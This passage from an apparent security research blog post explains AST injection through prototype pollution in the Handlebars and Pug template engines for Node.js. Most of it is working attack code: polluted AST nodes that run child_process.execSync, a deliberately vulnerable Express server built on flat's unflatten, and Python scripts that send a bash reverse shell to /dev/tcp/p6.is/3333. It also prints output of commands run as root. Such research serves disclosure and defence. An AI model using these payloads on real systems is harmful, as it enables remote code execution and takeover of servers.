class="attr">type</span>: <span class="string">'NumberLiteral'</span>, <span class="attr">value</span>: <span class="built_in">Number</span>($$[$<span class="number">0</span>]), <span class="attr">original</span>: <span class="built_in">Number</span>($$[$<span class="number">0</span>]), <span class="attr">loc</span>: yy.locInfo(<span class="keyword">this</span>._$) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>The parser in handlebars forces the value of a node whose type is NumberLiteral to always be a number through the Number constructor.<br>However, you can insert a non-numeric string here using the prototype pollution.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/base.js --&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseWithoutProcessing</span>(<span class="params">input, options</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Just return if an already-compiled AST was passed in.</span></span><br><span class="line">  <span class="keyword">if</span> (input.type === <span class="string">'Program'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _parser2[<span class="string">'default'</span>].yy = yy;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Altering the shared object here, but this is ok as parser is a sync operation</span></span><br><span class="line">  yy.locInfo = <span class="function"><span class="keyword">function</span> (<span class="params">locInfo</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> yy.SourceLocation(options &amp;&amp; options.srcName, locInfo);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ast = _parser2[<span class="string">'default'</span>].parse(input);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ast;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params">input, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ast = parseWithoutProcessing(input, options);</span><br><span class="line">  <span class="keyword">var</span> strip = <span class="keyword">new</span> _whitespaceControl2[<span class="string">'default'</span>](options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> strip.accept(ast);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>First, look at the compile function, and it supports two ways of input, AST Object and template string.</p><p>when input.type is a <code>Program</code>, although the input value is actually string.<br>Parser considers it’s already AST parsed by parser.js and send it to the compiler without any processing.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/compiler.js --&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">accept: <span class="function"><span class="keyword">function</span> <span class="title">accept</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>[node.type]) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">'default'</span>](<span class="string">'Unknown type: '</span> + node.type, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.sourceNode.unshift(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="keyword">this</span>[node.type](node);</span><br><span class="line">    <span class="keyword">this</span>.sourceNode.shift();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;,</span><br><span class="line">Program: <span class="function"><span class="keyword">function</span> <span class="title">Program</span>(<span class="params">program</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="keyword">new</span> <span class="built_in">Error</span>).stack)</span><br><span class="line">    <span class="keyword">this</span>.options.blockParams.unshift(program.blockParams);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> body = program.body,</span><br><span class="line">        bodyLength = body.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bodyLength; i++) &#123;</span><br><span class="line">        <span class="keyword">this</span>.accept(body[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.options.blockParams.shift();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.isSimple = bodyLength === <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>.blockParams = program.blockParams ? program.blockParams.length : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>The compiler given the AST Object (actually a string) send it to the <code>accept</code> method.<br>and <code>accept</code> calls <code>this[node.type]</code> of Compiler.<br>Then take body attribute of AST and use it for constructing function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Handlebars = <span class="built_in">require</span>(<span class="string">'handlebars'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.type = <span class="string">'Program'</span>;</span><br><span class="line"><span class="built_in">Object</span>.prototype.body = [&#123;</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"MustacheStatement"</span>,</span><br><span class="line">    <span class="string">"path"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"params"</span>: [&#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"NumberLiteral"</span>,</span><br><span class="line">        <span class="string">"value"</span>: <span class="string">"console.log(process.mainModule.require('child_process').execSync('id').toString())"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">"loc"</span>: &#123;</span><br><span class="line">        <span class="string">"start"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"end"</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = Handlebars.precompile(source);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="string">'('</span> + template + <span class="string">')'</span>)[<span class="string">'main'</span>].toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function (container, depth0, helpers, partials, data) &#123;</span></span><br><span class="line"><span class="comment">    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) &#123;</span></span><br><span class="line"><span class="comment">        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) &#123;</span></span><br><span class="line"><span class="comment">            return parent[propertyName];</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return undefined</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 &amp;&amp; lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || &#123;&#125;), console.log(process.mainModule.require('child_process').execSync('id').toString()), &#123;</span></span><br><span class="line"><span class="comment">        "name": "undefined",</span></span><br><span class="line"><span class="comment">        "hash": &#123;&#125;,</span></span><br><span class="line"><span class="comment">        "data": data,</span></span><br><span class="line"><span class="comment">        "loc": &#123;</span></span><br><span class="line"><span class="comment">            "start": 0,</span></span><br><span class="line"><span class="comment">            "end": 0</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;)) != null ? stack1 : "");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>As a result, an attack can be configured like this.<br>If you have gone through parser, specify a string that cannot be assigned to the value of NumberLiteral.<br>But Injected AST processed, we can insert any code into the function.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125; = <span class="built_in">require</span>(<span class="string">'flat'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> Handlebars  = <span class="built_in">require</span>(<span class="string">'handlebars'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> source = <span class="string">"&lt;h1&gt;It works!&lt;/h1&gt;"</span>;</span><br><span class="line">    <span class="keyword">var</span> template = Handlebars.compile(source);</span><br><span class="line">    res.end(template(&#123;&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/vulnerable'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> object = unflatten(req.body);</span><br><span class="line">    res.json(object);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>Example of configuring a vulnerable server using a flat module it has prototype pollution vulnerability.</p><p><img src="/img/2020/08/graph_6.png" alt="img"></p><p>The flat is a popular module with 4.61 million downloads per week<br>the patch for the prototype pollution vulnerablity reported has not yet been made.</p><blockquote><p><a href="https://github.com/hughsk/flat/issues/105" target="_blank" rel="noopener">https://github.com/hughsk/flat/issues/105</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">'http://p6.is:3000'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution</span></span><br><span class="line">requests.post(TARGET_URL + <span class="string">'/vulnerable'</span>, json = &#123;</span><br><span class="line">    <span class="string">"__proto__.type"</span>: <span class="string">"Program"</span>,</span><br><span class="line">    <span class="string">"__proto__.body"</span>: [&#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"MustacheStatement"</span>,</span><br><span class="line">        <span class="string">"path"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"params"</span>: [&#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"NumberLiteral"</span>,</span><br><span class="line">            <span class="string">"value"</span>: <span class="string">"process.mainModule.require('child_process').execSync(`bash -c 'bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1'`)"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="string">"loc"</span>: &#123;</span><br><span class="line">            <span class="string">"start"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">"end"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/pic_1.png" alt="img"></p><p>We can Insert the any command into the value to obtain the shell.</p><h2 id="Pug"><a href="#Pug" class="headerlink" title="Pug"></a>Pug</h2><p><img src="/img/2020/08/graph_7.png" alt="img"></p><p>Until today, this <code>pug</code> has been downloaded a total of <code>65,827,719</code> times.</p><p><code>pug</code> is a module that was previously developed under the name jade and renamed.<br>According to statistics, it is the 4th most popular template engine in nodejs.</p><h3 id="How-to-Detect-1"><a href="#How-to-Detect-1" class="headerlink" title="How to Detect"></a>How to Detect</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.compile(source);</span><br><span class="line"><span class="keyword">var</span> html = fn(&#123;<span class="attr">msg</span>: <span class="string">'It works'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(html); <span class="comment">// &lt;h1&gt;It works&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure><p>A common way to use a template in a pug is as above.<br>The pug.compile function converts a string into a template function and passes the object for reference.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.block = &#123;<span class="string">"type"</span>:<span class="string">"Text"</span>,<span class="string">"val"</span>:<span class="string">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.compile(source, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> html = fn(&#123;<span class="attr">msg</span>: <span class="string">'It works'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(html); <span class="comment">// &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure><p>It is a method to check the use of pug template engine in a black-box environment using prototype pollution.<br>When you insert AST into the <code>Object.prototype.block</code>, the compiler adds it to the buffer by referring to the val.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (ast.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'NamedBlock'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Block'</span>:</span><br><span class="line">        ast.nodes = walkAndMergeNodes(ast.nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Case'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Filter'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Mixin'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Tag'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'InterpolatedTag'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'When'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Code'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'While'</span>:</span><br><span class="line">        <span class="keyword">if</span> (ast.block) &#123;</span><br><span class="line">        ast.block = walkAST(ast.block, before, after, options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>When ast.type is <code>While</code>, it calls walkASK with <code>ast.block</code> (refers prototype if the value does not exist)<br>If the template refer any value from argument, the While node is always exists, so the reliblity is considered quite high.</p><p>In fact, if developer don’t have to refer to any values from argument in the template<br>they wouldn’t use any template engines in the first place.</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="/img/2020/08/graph_8.jpg" alt="img"></p><p><code>Pug</code> work as shown in the graph above.<br>Unlike <code>handlebars</code>, each process is separated into a separate module.<br>AST generated by <code>pug-parser</code> is passed to the <code>pug-code-gen</code> and made into a function.<br>and finally, it will be executed.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>pug-code-gen/index.js --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (debug &amp;&amp; node.debug !== <span class="literal">false</span> &amp;&amp; node.type !== <span class="string">'Block'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (node.line) &#123;</span><br><span class="line">        <span class="keyword">var</span> js = <span class="string">';pug_debug_line = '</span> + node.line;</span><br><span class="line">        <span class="keyword">if</span> (node.filename)</span><br><span class="line">            js += <span class="string">';pug_debug_filename = '</span> + stringify(node.filename);</span><br><span class="line">        <span class="keyword">this</span>.buf.push(js + <span class="string">';'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the compiler of the pug, there is a variable that stores the line number named <code>pug_debug_line</code> for debugging.<br>If the node.line value exists, it is added to the buffer, otherwise it is passed.</p><p>For AST generated with pug-parser, the <code>node.line</code> value is always specified as an integer.<br>But, we can insert a string into the <code>node.line</code> through AST Injection and cause arbitrary code execution.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.block = &#123;<span class="string">"type"</span>: <span class="string">"Text"</span>, <span class="string">"line"</span>: <span class="string">"console.log(process.mainModule.require('child_process').execSync('id').toString())"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.compile(source, &#123;&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(fn.toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function template(locals) &#123;</span></span><br><span class="line"><span class="comment">    var pug_html = "",</span></span><br><span class="line"><span class="comment">        pug_mixins = &#123;&#125;,</span></span><br><span class="line"><span class="comment">        pug_interp;</span></span><br><span class="line"><span class="comment">    var pug_debug_filename, pug_debug_line;</span></span><br><span class="line"><span class="comment">    try &#123;;</span></span><br><span class="line"><span class="comment">        var locals_for_with = (locals || &#123;&#125;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        (function (console, msg, process) &#123;;</span></span><br><span class="line"><span class="comment">            pug_debug_line = 1;</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + "\u003Ch1\u003E";;</span></span><br><span class="line"><span class="comment">            pug_debug_line = 1;</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? "" : pug_interp));;</span></span><br><span class="line"><span class="comment">            pug_debug_line = console.log(process.mainModule.require('child_process').execSync('id').toString());</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + "ndefine\u003C\u002Fh1\u003E";</span></span><br><span class="line"><span class="comment">        &#125;.call(this, "console" in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.console :</span></span><br><span class="line"><span class="comment">            typeof console !== 'undefined' ? console : undefined, "msg" in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.msg :</span></span><br><span class="line"><span class="comment">            typeof msg !== 'undefined' ? msg : undefined, "process" in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.process :</span></span><br><span class="line"><span class="comment">            typeof process !== 'undefined' ? process : undefined));;</span></span><br><span class="line"><span class="comment">    &#125; catch (err) &#123;</span></span><br><span class="line"><span class="comment">        pug.rethrow(err, pug_debug_filename, pug_debug_line);</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    return pug_html;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Example of a generated function.<br>You can see that the <code>Object.prototype.line</code> value is inserted in the right-hand side of the <code>pug_debug_line</code> definition.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.block = &#123;<span class="string">"type"</span>: <span class="string">"Text"</span>, <span class="string">"line"</span>: <span class="string">"console.log(process.mainModule.require('child_process').execSync('id').toString())"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.compile(source);</span><br><span class="line"><span class="keyword">var</span> html = fn(&#123;<span class="attr">msg</span>: <span class="string">'It works'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(html); <span class="comment">// "uid=0(root) gid=0(root) groups=0(root)\n\n&lt;h1&gt;It worksndefine&lt;/h1&gt;"</span></span><br></pre></td></tr></table></figure><p>As a result, an attack can be configured like this.<br>By specifying a string in the <code>node.line</code> value, which is always defined as number through parser.<br>So, any command could be inserted into the function.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125; = <span class="built_in">require</span>(<span class="string">'flat'</span>);</span><br><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(<span class="built_in">require</span>(<span class="string">'body-parser'</span>).json())</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> template = pug.compile(<span class="string">`h1= msg`</span>);</span><br><span class="line">    res.end(template(&#123;<span class="attr">msg</span>: <span class="string">'It works'</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/vulnerable'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> object = unflatten(req.body);</span><br><span class="line">    res.json(object);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>As in the example of handlebars, flat used to configure the server.<br>The template engine has been changed to <code>pug</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">'http://p6.is:3000'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution</span></span><br><span class="line">requests.post(TARGET_URL + <span class="string">'/vulnerable'</span>, json = &#123;</span><br><span class="line">    <span class="string">"__proto__.block"</span>: &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"Text"</span>, </span><br><span class="line">        <span class="string">"line"</span>: <span class="string">"process.mainModule.require('child_process').execSync(`bash -c 'bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1'`)"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/pic_2.png" alt="img"></p><p>We can insert any code into the <code>block.line</code>, and get a shell.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>I described how to make arbitrary command execution,<br>through AST Injection on the JS template engines.</p><p>In fact, these parts are very hard to fix completely<br>So I expect this to remain like EJS.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Real-world JS - 1</title>
      <link href="/Real-World-JS-1/"/>
      <url>/Real-World-JS-1/</url>
      
